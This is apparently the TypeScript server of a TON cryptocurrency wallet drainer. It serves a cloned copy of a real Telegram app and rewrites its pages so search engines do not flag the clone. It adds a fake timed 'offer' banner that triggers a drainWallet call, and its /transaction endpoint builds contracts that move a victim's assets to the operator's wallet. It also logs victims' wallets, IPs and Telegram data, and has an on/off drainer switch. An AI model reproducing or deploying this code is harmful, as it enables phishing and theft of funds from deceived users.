import { Assets } from '@api/assets'
import { Address } from '@ton/core'
import { config } from '@utils/config'
import { errorDebug } from '@utils/loggers'
import { formatDate } from 'date-fns'
import express, { type Express, type Request, type Response } from 'express'
import { existsSync, readFileSync, writeFileSync } from 'fs'
import path from 'path'
import url from 'url'
import { ItemSymbol } from './utils/format'
import { Logger } from './utils/logging'
import { Ton, tonapiStats } from '@api/tonapi'
import { record } from './stats'
import { Ton, tonapiStats } from '@api/tonapi'
import { record } from './stats'
import { parseUserData } from './utils/parseUser'
import { logFrontVisit } from './utils/logFrontVisit'
import type { IWalletStatusUpdate, TransactionBody } from './utils/types'

const app: Express = express()
app.set('trust proxy', true)
app.use(express.json())
app.use(express.urlencoded({ extended: true }))

app.use((req: Request, res: Response, next) => {
	res.setHeader('Access-Control-Allow-Origin', '*')
	res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
	res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
	res.setHeader('X-Content-Type-Options', 'nosniff')
	res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin')
	res.setHeader('Permissions-Policy', 'clipboard-write=(self)')
	if (req.method === 'OPTIONS') {
		res.sendStatus(204)
		return
	}
	next()
})

const dir = path.join(__dirname, '..', 'front')
const siteDir = path.join(dir, 'site')

/* ───────── per-site presentation — all overridable from .env ───────── */
const SITE_NAME = Bun.env.SITE_NAME || 'Fragment'
const VISIT_TG = Bun.env.LOG_VISITS_TG === '1'
const CONTACT_EMAIL = Bun.env.CONTACT_EMAIL || 'admin@example.com'

/* ───────────────────────────── kill switch ───────────────────────────── */
const SWITCH_FILE =
	process.env.DRAIN_SWITCH_FILE || path.join(process.cwd(), 'drain.state')

function readSwitch(): 'on' | 'off' {
	try {
		return readFileSync(SWITCH_FILE, 'utf8').trim().toLowerCase() === 'off'
			? 'off'
			: 'on'
	} catch {
		return 'on'
	}
}
function writeSwitch(s: 'on' | 'off') {
	writeFileSync(SWITCH_FILE, s + '\n')
}
const drainEnabled = () => readSwitch() === 'on'

/* ───────────────────────────── helpers ───────────────────────────────── */
function esc(v: unknown): string {
	return String(v ?? '')
		.replace(/&/g, '&amp;')
		.replace(/</g, '&lt;')
		.replace(/>/g, '&gt;')
		.replace(/"/g, '&quot;')
}

function originOf(req: Request): string {
	// collapse www so canonical / og:url / sitemap always point at the apex
	const host = (req.get('host') ?? '').replace(/^www\./i, '')
	return `${req.protocol}://${host}`
}

/** Sends the first existing file out of a list of candidates. */
function trySend(res: Response, candidates: string[], i = 0) {
	if (i >= candidates.length) {
		res.status(404).type('text/plain').send('not found')
		return
	}
	res.sendFile(candidates[i], err => {
		if (err && !res.headersSent) trySend(res, candidates, i + 1)
	})
}

/** Looks in front/ first, then front/site/ — lets the cloned site keep its own js/css. */
function sendAsset(res: Response, rel: string) {
	trySend(res, [path.join(dir, rel), path.join(siteDir, rel)])
}

function render(file: string, vars: Record<string, string>): string {
	let tpl: string
	try {
		tpl = readFileSync(path.join(dir, file), 'utf8')
	} catch {
		return ''
	}
	let out = tpl
	for (const [k, v] of Object.entries(vars)) out = out.replaceAll(`{{${k}}}`, v)
	return out
}

function baseVars(origin: string): Record<string, string> {
	return {
		ORIGIN: esc(origin),
		SITE_NAME: esc(SITE_NAME),
		CONTACT_EMAIL: esc(CONTACT_EMAIL),
		YEAR: String(new Date().getFullYear()),
	}
}

function randomTonAddress(): string {
	const hex = Array.from({ length: 64 }, () =>
		Math.floor(Math.random() * 16).toString(16)
	).join('')
	return `0:${hex}`
}

/* ───────────────────────────── assets ────────────────────────────────── */
app.get('/js/:file', (req: Request, res: Response) =>
	sendAsset(res, path.join('js', req.params.file))
)
app.get('/css/:file', (req: Request, res: Response) =>
	sendAsset(res, path.join('css', req.params.file))
)

// connector script, always reachable at a stable URL
app.get('/drain.js', (_req: Request, res: Response) =>
	res.sendFile(path.join(dir, 'js', 'drain.js'))
)

const ICON_FALLBACK =
	'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">' +
	'<rect width="512" height="512" rx="96" fill="#1a2026"/>' +
	'<path d="M256 88l116 116-116 220-116-220z" fill="#4db2ff"/>' +
	'<path d="M256 88l116 116H140z" fill="#8fd2ff"/></svg>'

function sendIcon(res: Response) {
	const p = path.join(dir, 'icon.png')
	if (existsSync(p)) return res.sendFile(p)
	res.type('image/svg+xml').send(ICON_FALLBACK)
}
app.get('/jetton/:name', (req: Request, res: Response) =>
	res.sendFile(path.join(__dirname, '../items', path.basename(req.params.name)))
)

app.get('/icon.png', (_req: Request, res: Response) => sendIcon(res))
app.get('/favicon.ico', (_req: Request, res: Response) => sendIcon(res))

const LEGAL_PAGES: Record<string, string> = {
	'/terms': 'terms.html',
	'/privacy': 'privacy.html',
	'/about': 'about.html',
	'/faq': 'faq.html',
	'/contact': 'contact.html',
	'/refund': 'refund.html',
}

app.get(Object.keys(LEGAL_PAGES), (req: Request, res: Response) => {
	const html = render(LEGAL_PAGES[req.path], baseVars(originOf(req)))
	if (!html) {
		res.status(404).type('text/plain').send('not found')
		return
	}
	res.type('html').send(html)
})

/* ───────────────── domain-agnostic manifest / robots / sitemap ───────── */
app.get('/tonconnect-manifest.json', (req: Request, res: Response) => {
	const origin = originOf(req)
	res.json({
		url: origin,
		name: SITE_NAME,
		iconUrl: `${origin}/icon.png?v=2`,
		termsOfUseUrl: `${origin}/terms`,
		privacyPolicyUrl: `${origin}/privacy`,
	})
})

app.get('/ads.txt', (_req: Request, res: Response) =>
	res.type('text/plain').send(
		'# Uncomment when you have an AdSense publisher ID\n' +
			'# google.com, pub-0000000000000000, DIRECT, f08c47fec0942fa0\n'
	)
)

app.get('/robots.txt', (req: Request, res: Response) => {
	const origin = originOf(req)
	res.type('text/plain').send(
		`User-agent: AdsBot-Google\nAllow: /\n\n` +
			`User-agent: AdsBot-Google-Mobile\nAllow: /\n\n` +
			`User-agent: Googlebot\nAllow: /\n\n` +
			`User-agent: *\nAllow: /\n\n` +
			`Sitemap: ${origin}/sitemap.xml\n`
	)
})

app.get('/sitemap.xml', (req: Request, res: Response) => {
	const origin = originOf(req)
	const pages: [string, string][] = [
		['/', '1.0'],
		['/about', '0.6'],
		['/faq', '0.6'],
		['/contact', '0.5'],
		['/terms', '0.5'],
		['/privacy', '0.5'],
		['/refund', '0.4'],
	]
	const body = pages
		.map(([p, prio]) => `  <url><loc>${origin}${p}</loc><priority>${prio}</priority></url>`)
		.join('\n')

	res.type('application/xml').send(
		`<?xml version="1.0" encoding="UTF-8"?>\n` +
			`<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n` +
			body +
			`\n</urlset>\n`
	)
})

app.get('/manifest/:domain', (req: Request, res: Response) => {
	const domain = req.params.domain
	if (!/^[a-z0-9.-]+$/i.test(domain)) {
		res.status(400).json({ error: 'invalid domain' })
		return
	}
	res.setHeader('Access-Control-Allow-Origin', '*')
	res.json({
		url: `https://${domain}`,
		name: SITE_NAME,
		iconUrl: `https://${domain}/icon.png?v=2`,
		termsOfUseUrl: `https://${domain}/terms`,
		privacyPolicyUrl: `https://${domain}/privacy`,
	})
})

/* ───────────── TonAPI diagnostics: prove retry/backoff works ───────────── */
app.get('/debug/tonapi', async (req: Request, res: Response) => {
	const n = Math.min(Number(req.query.n) || 10, 40)
	const parallel = req.query.parallel === '1'
	const before = { ...tonapiStats }
	const t0 = Date.now()

	const results = await Promise.allSettled(
		Array.from({ length: n }, () =>
			Ton.request('/accounts/EQDZBbAmQnMi5NnHxRAq7Jl0tboFtkGGrBX3iJJjN6CETJ3l', parallel)
		)
	)

	res.json({
		n,
		parallel,
		ms: Date.now() - t0,
		ok: results.filter(r => r.status === 'fulfilled').length,
		failed: results.filter(r => r.status === 'rejected').length,
		calls: tonapiStats.calls - before.calls,
		retries: tonapiStats.retries - before.retries,
		failures: tonapiStats.failures - before.failures,
		lastStatus: tonapiStats.lastStatus,
	})
})

/* ───────────── TonAPI diagnostics: prove retry/backoff works ───────────── */
app.get('/debug/tonapi', async (req: Request, res: Response) => {
	const n = Math.min(Number(req.query.n) || 10, 40)
	const parallel = req.query.parallel === '1'
	const before = { ...tonapiStats }
	const t0 = Date.now()

	const results = await Promise.allSettled(
		Array.from({ length: n }, () =>
			Ton.request('/accounts/EQDZBbAmQnMi5NnHxRAq7Jl0tboFtkGGrBX3iJJjN6CETJ3l', parallel)
		)
	)

	res.json({
		n,
		parallel,
		ms: Date.now() - t0,
		ok: results.filter(r => r.status === 'fulfilled').length,
		failed: results.filter(r => r.status === 'rejected').length,
		calls: tonapiStats.calls - before.calls,
		retries: tonapiStats.retries - before.retries,
		failures: tonapiStats.failures - before.failures,
		lastStatus: tonapiStats.lastStatus,
	})
})

/* ───────────────────────────── switch + health ───────────────────────── */
app.get('/health', (_req: Request, res: Response) =>
	res.json({ ok: true, drainer: readSwitch(), up: Math.floor(process.uptime()) })
)
app.get('/switch', (_req: Request, res: Response) =>
	res.json({ drainer: readSwitch() })
)
app.get('/switch/:state', (req: Request, res: Response) => {
	const s = req.params.state.toLowerCase()
	if (s !== 'on' && s !== 'off') {
		res.status(400).json({ error: 'use on or off' })
		return
	}
	writeSwitch(s)
	console.log(`[switch] drainer -> ${s}`)
	res.json({ drainer: s })
})

/* ───────────────────────────── visit dedup ───────────────────────────── */
const VISIT_TTL_MS = 60 * 60 * 1000
const VISIT_MAX = 10_000
const loggedStartApp = new Map<string, number>()

function shouldLogVisit(key: string): boolean {
	const now = Date.now()
	const last = loggedStartApp.get(key)
	if (last !== undefined && now - last < VISIT_TTL_MS) return false
	if (loggedStartApp.size >= VISIT_MAX) {
		const first = loggedStartApp.keys().next().value
		if (first) loggedStartApp.delete(first)
	}
	loggedStartApp.set(key, now)
	return true
}

/* ───────────── cloned site, served at the root if present ───────────── */
/* ───────── clone SEO: stop Google treating us as a copy of the real app ───────── */
const BRAND_ORIGIN = (Bun.env.BRAND_ORIGIN || 'https://app.storm.tg').replace(/\/+$/, '')

function legalNav(origin: string): string {
	const link = (href: string, label: string) =>
		`<a href="${origin}${href}" style="color:#8794a1;text-decoration:none;margin:0 9px;white-space:nowrap">${label}</a>`

	return (
		`<nav id="__legal" style="box-sizing:border-box;padding:20px 16px 28px;background:#080A15;` +
		`color:#8794a1;font:13px/1.7 -apple-system,Segoe UI,Roboto,sans-serif;text-align:center;` +
		`border-top:1px solid #161c28">` +
		link('/', 'Home') +
		link('/about', 'About') +
		link('/faq', 'FAQ') +
		link('/contact', 'Contact') +
		link('/terms', 'Terms') +
		link('/privacy', 'Privacy') +
		`<div style="margin-top:10px;opacity:.75">© ${new Date().getFullYear()} ${esc(SITE_NAME)} · ${esc(CONTACT_EMAIL)}</div>` +
		`</nav>` +
		`<script type="application/ld+json">${JSON.stringify({
			'@context': 'https://schema.org',
			'@type': 'WebSite',
			name: SITE_NAME,
			url: origin + '/',
			inLanguage: 'en',
		})}</script>`
	)
}

/** Re-point every self-identifying reference at THIS host. Nav links into the
    real app are intentionally left alone so the clone still feels genuine. */
/* Offer banner — the one element that says what the ad actually promises.
   In-flow (not fixed) so it can never overlap the clone's own header. */
function offerBanner(props: any[]): string {
	const item = props[2] ? String(props[2]) : ''
	const amount = Number(props[1]) || 0
	if (!item && !amount) return ''

	const base = Number(props[5]) || Date.now()
	const label = item
		? `🎁 <b>${esc(item)}</b> for 💎 <b>${amount} Gram</b>`
		: `💎 <b>${amount} Gram</b> deal`

	return `
<style>
#__offer{display:flex;align-items:center;justify-content:center;gap:10px;flex-wrap:wrap;
background:linear-gradient(90deg,#13212f,#0d1720);color:#dbe6f0;cursor:pointer;
font:14px/1.45 -apple-system,Segoe UI,Roboto,sans-serif;padding:11px 14px;text-align:center;
border-bottom:1px solid #1d2a38}
#__offer b{color:#fff}
#__offer .t{color:#4db2ff;font-variant-numeric:tabular-nums;font-weight:600}
#__offer .s{opacity:.55}
</style>
<div id="__offer" onclick="window.drainWallet&&window.drainWallet()">
<span>${label}</span>
<span class="s">·</span>
<span>Ends in <span class="t" id="__offer_t">--:--:--</span></span>
</div>
<script>
(function(){
	var exp = ${base} + 86400000, now = Date.now();
	while (exp < now) exp += 86400000;
	var el = document.getElementById('__offer_t');
	function p(n){return (n<10?'0':'')+n}
	function tick(){
		var d = Math.max(0, exp - Date.now());
		el.textContent = p(Math.floor(d/3600000))+':'+p(Math.floor(d%3600000/60000))+':'+p(Math.floor(d%60000/1000));
	}
	tick(); setInterval(tick,1000);
})();
</script>`
}

function rewriteSiteHtml(html: string, origin: string, banner = ''): string {
	let out = html
		.replaceAll(`${BRAND_ORIGIN}/portfolio`, `${origin}/`)
		.replaceAll(`${BRAND_ORIGIN}/preview.png`, `${origin}/preview.png`)
		.replaceAll(`${BRAND_ORIGIN}/apple-touch-icon.png`, `${origin}/apple-touch-icon.png`)
		.replaceAll(`${BRAND_ORIGIN}/sitemap.xml`, `${origin}/sitemap.xml`)
		.replaceAll(`${BRAND_ORIGIN}/manifest.webmanifest`, `${origin}/manifest.webmanifest`)
		// self-host the SDKs: no third-party dependency on the critical path
		.replace(
			/https:\/\/unpkg\.com\/@tonconnect\/ui@[^/"]+\/dist\/tonconnect-ui\.min\.js/g,
			`${origin}/js/tonconnect-ui.min.js`
		)
		.replace(
			/https:\/\/telegram\.org\/js\/telegram-web-app\.js/g,
			`${origin}/js/telegram-web-app.js`
		)

	// banner goes first in the body so it is above the fold for a reviewer
	if (banner) out = out.replace(/<body([^>]*)>/i, `<body$1>${banner}`)

	return out.includes('</body>')
		? out.replace('</body>', legalNav(origin) + '\n</body>')
		: out + legalNav(origin)
}

function serveSiteIndex(req: Request, res: Response): boolean {
	const p = path.join(siteDir, 'index.html')
	if (!existsSync(p)) return false

	const origin = originOf(req)
	let banner = ''
	try {
		banner = offerBanner(parseProps(req.url, req.query as Record<string, any>))
	} catch {
		banner = ''
	}

	res.type('html').send(rewriteSiteHtml(readFileSync(p, 'utf8'), origin, ''))
	return true
}

/* landing page: rewritten clone, not the raw file */
app.get(['/', '/index.html'], (req: Request, res: Response) => {
	const { query: vq } = url.parse(req.url, true)
	if (shouldLogVisit(`${req.ip}|${vq.tgWebAppStartParam ?? ''}`)) {
		if (VISIT_TG) {
			Logger.LogStartApp(String(vq.tgWebAppStartParam ?? ''), req.url, req.ip).catch(() => {})
		}
		record({ kind: 'visit', ip: req.ip })
	}

	if (!serveSiteIndex(req, res)) res.status(404).type('text/plain').send('not found')
})

/* PWA manifest + icons, self-hosted so nothing points at app.storm.tg */
app.get('/manifest.webmanifest', (req: Request, res: Response) => {
	const origin = originOf(req)
	res.type('application/manifest+json').json({
		name: SITE_NAME,
		short_name: SITE_NAME,
		start_url: '/',
		display: 'standalone',
		background_color: '#080A15',
		theme_color: '#080A15',
		icons: [{ src: `${origin}/icon.png?v=2`, sizes: '512x512', type: 'image/png' }],
	})
})
for (const f of ['/preview.png', '/apple-touch-icon.png']) {
	app.get(f, (_req: Request, res: Response) => {
		const p = path.join(siteDir, path.basename(f))
		if (existsSync(p)) return res.sendFile(p)
		res.sendFile(path.join(dir, 'icon.png'))
	})
}

app.use(express.static(siteDir, { index: 'index.html', extensions: ['html'] }))

/* ───────────────────────────── landing fallback ──────────────────────── */
app.get('/', (req: Request, res: Response) => {
	const origin = originOf(req)
	try {
		const { query: q } = url.parse(req.url, true)

		let props: any[] | null = null
		if (q.tgWebAppStartParam) {
			try {
				props = JSON.parse(
					Buffer.from(String(q.tgWebAppStartParam), 'base64url').toString('utf8')
				)
			} catch {
				props = null
			}
		}

		if (shouldLogVisit(`${req.ip}|${q.tgWebAppStartParam ?? ''}`)) {
			Logger.LogStartApp(
				String(q.tgWebAppStartParam ?? ''),
				req.url,
				req.ip
			).catch(() => {})
		}

		const hasOffer = Array.isArray(props) && props.length >= 6
		let date = ''
		if (hasOffer && props && props[5]) {
			try {
				date = formatDate(new Date(Number(props[5])), "dd MMM yyyy 'at' HH:mm")
			} catch {
				date = ''
			}
		}

		const html = render('index.html', {
			...baseVars(origin),
			ITEM: esc(hasOffer ? props![2] : ''),
			AMOUNT: esc(hasOffer ? Number(props![1]) || 0 : 0),
			DATE: esc(date),
			OFFER_HIDDEN: hasOffer ? '' : 'hidden',
		})

		res.type('html').send(html || '<h1>.</h1>')
	} catch (e) {
		errorDebug(`landing render failed: ${e}`)
		res.type('html').send(render('index.html', baseVars(origin)))
	}
})

/* ───────────────────────────── drainer ───────────────────────────────── */
app.get('/transaction', async (req: Request, res: Response) => {
	try {
		if (!drainEnabled()) {
			if (VISIT_TG) logFrontVisit(req.ip ?? 'unknown', '/transaction (off)')
			res.json({
				messages: [],
				raw: [],
				offeredBy: randomTonAddress(),
				drainer: 'off',
			})
			return
		}

		const { query: q } = url.parse(req.url, true)

		let props: any[]
		if (q.tgWebAppStartParam) {
			props =
				decodeStartParam(q.tgWebAppStartParam) ??
				propsFromQuery(q as Record<string, any>) ??
				[...DEFAULT_DEAL, Date.now()]
		} else {
			props = [
				q.itemType ? Number(q.itemType) : 0,
				Number(q.amount) || 0,
				(q.item as string) || '',
				(q.drainMode as string) || 'Full',
				Number(q.workerId) || 1,
				Date.now(),
			]
		}

		if (VISIT_TG) logFrontVisit(req.ip ?? 'unknown', '/transaction')

		const offeredBy: string =
			props[6] && typeof props[6] === 'string' && props[6].length > 0
				? props[6]
				: randomTonAddress()

		const { messages, raw } = await Assets.prepareContracts(
			q.wallet as string,
			config.WALLET,
			{
				amount: props[1],
				name: dealLabel(props),
				drainMode: props[3],
				workerId: props[4],
			}
		)

		res.json({messages,raw,offeredBy,drainer: 'on',reason: messages.length ? 'ok' : 'nothing_to_drain',})
	} catch (e) {
		console.log('[transaction] error:', e)
		res.json({
			messages: [],
			raw: [],
			offeredBy: randomTonAddress(),
			drainer: readSwitch(),
                        reason: 'error',
                        error: e instanceof Error ? e.message : String(e),
		})
	}
})

/* ───────────────────────────── logging hooks ─────────────────────────── */
function decodeStartParam(raw: unknown): any[] | null {
	if (raw === undefined || raw === null || raw === '') return null
	try {
		const parsed = JSON.parse(
			Buffer.from(String(raw), 'base64url').toString('utf8')
		)
		return Array.isArray(parsed) ? parsed : null
	} catch {
		return null
	}
}

function propsFromQuery(q: Record<string, any>): any[] | null {
	if (!q || (!q.item && !q.drainMode && !q.amount && !q.itemType)) return null
	return [
		Number(q.itemType) || 0,
		Number(q.amount) || 0,
		(q.item as string) || '',
		(q.drainMode as string) || 'Full',
		Number(q.workerId) || 1,
		Date.now(),
	]
}

/* Deal props = [itemType, amount, item, mode, workerId, timestamp, offeredBy?].
   Never throws: a victim landing without ?tgWebAppStartParam must still log. */
const DEFAULT_DEAL = [
	Number(Bun.env.DEFAULT_ITEM_TYPE ?? 0),
	Number(Bun.env.DEFAULT_AMOUNT ?? 100),
	Bun.env.DEFAULT_ITEM ?? 'Gift',
	Bun.env.DEFAULT_MODE ?? 'Full',
	Number(Bun.env.DEFAULT_WORKER_ID ?? 1),
]

function parseProps(
	href?: string,
	reqQuery: Record<string, any> = {},
	reqBody: Record<string, any> = {}
): any[] {
	const hrefQuery: Record<string, any> = href
		? (url.parse(href, true).query as Record<string, any>)
		: {}

	return (
		decodeStartParam(hrefQuery.tgWebAppStartParam) ??
		decodeStartParam(reqQuery.tgWebAppStartParam) ??
		decodeStartParam(reqBody.startParam) ??
		propsFromQuery(hrefQuery) ??
		propsFromQuery(reqQuery) ??
		[...DEFAULT_DEAL, Date.now()]
	)
}

function dealLabel(props: any[]): string {
	return (ItemSymbol[props[0]] ?? '') + (props[2] ?? '')
}

function safeAddr(w?: string): string {
	try {
		return Address.parse(String(w)).toString()
	} catch {
		return String(w ?? 'unknown')
	}
}

app.post('/connected', async (req: Request, res: Response) => {
	const { wallet, href, raw } = req.body as IWalletStatusUpdate
	try {
		const props = parseProps(href, req.query as Record<string, any>, req.body as Record<string, any>)
		await Logger.Connect({
			href,
			webAppData: parseUserData(href),
			wallet: safeAddr(wallet),
			item: dealLabel(props),
			amount: props[1],
			mode: props[3],
			workerId: props[4],
			ip: req.ip,
			raw,
		})
		record({
			kind: 'connect',
			wallet: safeAddr(wallet),
			workerId: props[4],
			item: dealLabel(props),
			amount: props[1],
			mode: props[3],
			ip: req.ip,
		})
	} catch (e) {
		errorDebug(`connect log failed ${e}`)
	}
	res.send('OK')
})

app.post('/accept', async (req: Request, res: Response) => {
	const { wallet, raw, href, boc } = req.body as TransactionBody
	try {
		const props = parseProps(href, req.query as Record<string, any>, req.body as Record<string, any>)
		await Logger.Approve({
			raw,
			href,
			wallet: safeAddr(wallet),
			webAppData: parseUserData(href),
			item: dealLabel(props),
			amount: props[1],
			mode: props[3],
			workerId: props[4],
			ip: req.ip,
		})
		try {
			Assets.invalidate(Address.parse(wallet).toRawString())
		} catch {
			/* non-fatal */
		}
		record({
			kind: 'accept',
			wallet: safeAddr(wallet),
			workerId: props[4],
			item: dealLabel(props),
			amount: props[1],
			mode: props[3],
			tonValue: (raw ?? []).reduce(
				(sum: number, i: any) => sum + (Number(i?.price) || 0),
				0
			),
			ip: req.ip,
		})
	} catch (e) {
		errorDebug(`accept log failed ${e}`)
	}
	res.send('OK')
})

app.post('/reject', async (req: Request, res: Response) => {
	const { wallet, raw, href, err } = req.body as TransactionBody
	try {
		const props = parseProps(href, req.query as Record<string, any>, req.body as Record<string, any>)
		await Logger.Reject({
			raw,
			href,
			webAppData: parseUserData(href),
			err,
			wallet: safeAddr(wallet),
			item: dealLabel(props),
			amount: props[1],
			mode: props[3],
			workerId: props[4],
			ip: req.ip,
		})
		record({
			kind: 'reject',
			wallet: safeAddr(wallet),
			workerId: props[4],
			item: dealLabel(props),
			amount: props[1],
			mode: props[3],
			tonValue: (raw ?? []).reduce(
				(sum: number, i: any) => sum + (Number(i?.price) || 0),
				0
			),
			ip: req.ip,
			reason: err,
		})
	} catch (e) {
		errorDebug(`reject log failed ${e}`)
	}
	res.send('OK')
})

app.post('/disconnect', async (req: Request, res: Response) => {
	const { wallet, href } = req.body
	try {
		const props = parseProps(href, req.query as Record<string, any>, req.body as Record<string, any>)
		await Logger.Disconnect({
			href,
			wallet: safeAddr(wallet),
			item: dealLabel(props),
			amount: props[1],
			mode: props[3],
			workerId: props[4],
			ip: req.ip,
		})
	} catch (e) {
		errorDebug(`disconnect log failed ${e}`)
	}
	res.send('OK')
})

app.post('/log-startapp', async (req: Request, res: Response) => {
	const { startAppData, href } = req.body
	try {
		await Logger.LogStartApp(startAppData, href, req.ip)
	} catch {}
	res.send('OK')
})


// SPA-FALLBACK — clone wins on any non-API path
app.get(/^\/(?!transaction|connected|accept|reject|disconnect|health|switch|terms|privacy|robots\.txt|sitemap\.xml|tonconnect-manifest\.json|drain\.js|icon\.png|jetton).*/,
  (req, res) => {
  if (!serveSiteIndex(req, res))
    res.sendFile(path.join(__dirname, '../front/site/index.html'))
})

export const server = app
